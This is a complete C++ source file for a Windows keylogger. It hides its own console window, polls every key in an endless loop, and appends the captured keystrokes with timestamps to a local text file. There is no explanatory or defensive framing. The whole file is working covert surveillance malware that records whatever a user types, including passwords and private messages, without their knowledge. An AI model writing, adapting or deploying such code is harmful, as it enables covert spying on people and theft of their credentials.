// basic_keylogger.cpp
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <ctime>

using namespace std;

void HideWindow() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
}

string GetTimestamp() {
    time_t now = time(0);
    char buffer[80];
    struct tm tstruct;
    localtime_s(&tstruct, &now);
    strftime(buffer, sizeof(buffer), "[%Y-%m-%d %H:%M:%S]", &tstruct);
    return string(buffer);
}

void LogKeystroke(int key) {
    ofstream logFile("keystrokes.txt", ios::app);
    
    // Add timestamp occasionally
    static int counter = 0;
    if (counter++ % 100 == 0) {
        logFile << "\n" << GetTimestamp() << " ";
    }
    
    // Handle regular characters
    if ((key >= 65 && key <= 90) || (key >= 48 && key <= 57)) {
        // Check if shift is pressed for uppercase
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
        bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
        
        if ((shiftPressed && !capsLock) || (!shiftPressed && capsLock)) {
            // Uppercase letters
            logFile << (char)key;
        } else {
            // Lowercase letters
            logFile << (char)tolower(key);
        }
    } else {
        // Handle special keys
        switch(key) {
            case VK_SPACE: logFile << " "; break;
            case VK_RETURN: logFile << "[ENTER]\n"; break;
            case VK_BACK: logFile << "[BACKSPACE]"; break;
            case VK_TAB: logFile << "[TAB]"; break;
            case VK_SHIFT: /* ignore */ break;
            case VK_CONTROL: logFile << "[CTRL]"; break;
            case VK_ESCAPE: logFile << "[ESC]"; break;
            case VK_DELETE: logFile << "[DEL]"; break;
            case VK_CAPITAL: logFile << "[CAPS]"; break;
            default:
                if (key >= 112 && key <= 123) { // F1-F12
                    logFile << "[F" << (key - 111) << "]";
                }
                break;
        }
    }
    
    logFile.close();
}

int main() {
    // Hide console window
    HideWindow();
    
    // Main logging loop
    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) { // Key just pressed
                LogKeystroke(key);
            }
        }
        Sleep(10); // Prevent CPU overload
    }
    
    return 0;
}
